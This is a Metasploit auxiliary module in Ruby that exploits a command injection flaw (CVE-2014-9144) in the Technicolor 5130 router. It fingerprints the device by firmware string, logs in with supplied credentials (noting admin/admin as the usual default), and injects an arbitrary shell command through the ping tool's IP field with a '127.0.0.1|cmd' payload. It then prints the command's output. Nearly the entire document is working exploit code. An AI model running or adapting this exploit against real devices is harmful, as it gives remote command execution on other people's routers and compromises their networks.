##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary



  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Technicolor 5130 Command Injection",
      'Description'    => %q{
        This module exploits a vulnerability found in Technicolor 5130.  By
        supplying a specially crafted request is possible to execute arbitrary 
		commands. This device has several chars limitations to execute direct commands in web interface,
		to solve it, you need to create an directory in ftp server and upload a .sh file. This file can not be 
		uploaded in root ftp service. If you use this way, you need change the CMD variable to: /share/somedir/some.sh.
		
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Ewerson Guimaraes(Crash) <crash[at]dclabs.com.br>',  
                  ],
      'References'     =>
        [
          ['CVE', 'CVE-2014-9144'],
          ['OSVDB', '115283'],
          ['US-CERT-VU', '']
        ],
      'DefaultOptions' =>
        {
          'SSL' => false
        },
            'Privileged'     => 'False',
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Feb 3 2014'
    ))

    register_options(
      [
        Opt::RPORT(80),
        # USERNAME/PASS normaly admin/admin
        OptString.new("USERNAME", [true, 'The username to authenticate as']),
        OptString.new("PASSWORD", [true, 'The password to authenticate with']),
		OptString.new("CMD", [true, 'The command to execute','ps']),
      ], self.class)
  end

  def run
    sig = "1.04.B04"
	  username = datastore['USERNAME']
      password = datastore['PASSWORD']
	  cmd = datastore['CMD']
	  
begin
      	res = send_request_cgi({
			'method' => 'GET',
			'uri'    => '/comm/__comm.js'
				
			}
		)
   print_status("#{rhost}:#{rport} - Checking device...")
    if not res
       print_error("#{rhost}:#{rport} - Exploit failed or not vulnerable.")
	   return Exploit::CheckCode::Unknown
    end

    if res.code == 200 && res.body =~ /#{sig}/
     	  print_good("#{rhost}:#{rport} - Vulnerable device")

     res = send_request_cgi({
      'method' => 'POST',
      'uri'    => '/cgi-bin/basicauth.cgi?index.html',
      'vars_post' => {
        'userlevel'         => '15',
		'refer'         	=> '%2Findex.html',
		'failrefer'         => '%2Fadmin.shtml%3Ffail',
		'login'         	=> 'Login',
	    'user'              => username,
        'password'          => password
      }
    })
	 session = $1 if res.get_cookies =~ /ID=([0-9a-z]*)/

      if session.nil?
        print_error('Failed to retrieve the current session id')
        return
      end
	     print_good("#{rhost}:#{rport} - Cookie Information: #{res.get_cookies}")
		  res = send_request_cgi(
      'cookie' => "#{res.get_cookies}",
      'method' => 'POST',
      'uri'    => '/cgi-bin/setobject?/tools/tools_ping.shtml',
	  'vars_post' => {
        'setobject_token'         => 'SESSION_CONTRACT_TOKEN_TAG=0123456789012345',
		'setobject_ip'         	  => "s1.3.6.1.4.1.283.1000.2.1.6.4.1.0=127.0.0.1|#{cmd}",
		'setobject_ping'          => 'i1.3.6.1.4.1.283.1000.2.1.6.4.2.0=1',
		'getobject_result'        => 'IGNORE'
	          }
    )
	res = send_request_cgi({
			'method' => 'GET',
			'uri'    => '/tools/tools_ping_result.shtml',
			'headers' =>
            {
            'Accept' =>	'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
			'Accept-Encoding' => 'gzip, deflate',
			'Accept-Language' => 'pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3',
			'Cache-Control' => 'max-age=0',
			'Connection' => 'keep-alive',
			'Cookie' =>	"#{res.get_cookies}",
			'Host' => "#{rhost}",
			'Referer' => "#{rhost}/tools/tools_ping.shtml",
			'User-Agent' => 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0',
            }
						
			}
		)
	
end

	
	remove_html = res.body.gsub(/<\/?[^>]*>/, '').gsub(/^\s+/, '').strip
	
	r1= remove_html
	print_good("Command output: \r\n#{r1}")
	 end

    end


  end


   
#end



